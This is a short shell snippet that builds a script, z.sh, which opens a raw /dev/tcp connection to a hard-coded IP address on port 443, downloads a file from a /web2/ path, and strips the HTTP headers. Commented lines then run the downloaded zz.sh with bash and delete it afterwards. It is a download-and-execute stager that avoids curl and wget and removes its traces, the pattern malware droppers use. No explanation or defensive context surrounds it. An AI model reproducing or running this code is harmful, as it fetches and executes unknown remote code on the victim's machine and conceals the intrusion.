echo '#!/bin/bash' > z.sh
echo 'read proto server path <<<$(echo ${1//// })' >> z.sh
echo 'exec 3<>/dev/tcp/42.51.64.146/443' >> z.sh
echo 'echo -en "GET /web2/$1 HTTP/1.0\r\nHost: 42.51.64.146:443\r\n\r\n" >&3' >> z.sh
echo '(while read line; do' >> z.sh
echo '[[ "$line" == $'\''\r'"'"' ]] && break' >> z.sh
echo 'done && cat) <&3' >> z.sh
echo 'exec 3>&-' >> z.sh
# bash z.sh zz.sh > zz.sh ; bash zz.sh
# rm -rf zz.sh
